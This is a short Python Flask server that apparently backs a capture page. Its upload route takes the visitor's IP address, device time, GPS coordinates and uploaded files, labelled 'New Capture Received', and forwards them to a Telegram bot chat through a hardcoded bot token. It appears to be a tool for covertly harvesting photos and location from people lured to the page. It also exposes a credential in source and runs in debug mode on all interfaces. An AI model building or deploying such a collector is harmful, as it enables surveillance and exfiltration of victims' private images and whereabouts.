from flask import Flask, render_template, request
import requests
import datetime
import json
import os
app = Flask(__name__)

BOT_TOKEN = '6997914641:AAEdrtEZbk59jKZO8uNZoU-ILxyLENsFQSU'
CHAT_ID = '6997914641'  # Your chat ID

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    ip_address = request.remote_addr
    meta_json = request.form.get('meta')

    if meta_json:
        try:
            meta = json.loads(meta_json)
        except json.JSONDecodeError:
            meta = {}

        device_time = meta.get("timestamp", "Unknown")
        latitude = meta.get("latitude", "Unavailable")
        longitude = meta.get("longitude", "Unavailable")

        message = (
            "📸 *New Capture Received*\n\n"
            f"🕰️ *Server Time:* `{datetime.datetime.now().isoformat()}`\n"
            f"🕰️ *Device Time:* `{device_time}`\n"
            f"🌐 *IP Address:* `{ip_address}`\n"
            f"📍 *Location:* `{latitude}, {longitude}`"
        )

        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            data={
                'chat_id': CHAT_ID,
                'text': message,
                'parse_mode': 'Markdown'
            }
        )

    for key in request.files:
        file = request.files[key]
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',
            data={'chat_id': CHAT_ID},
            files={'document': (file.filename, file)}
        )

    return 'Sent to Telegram.'

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
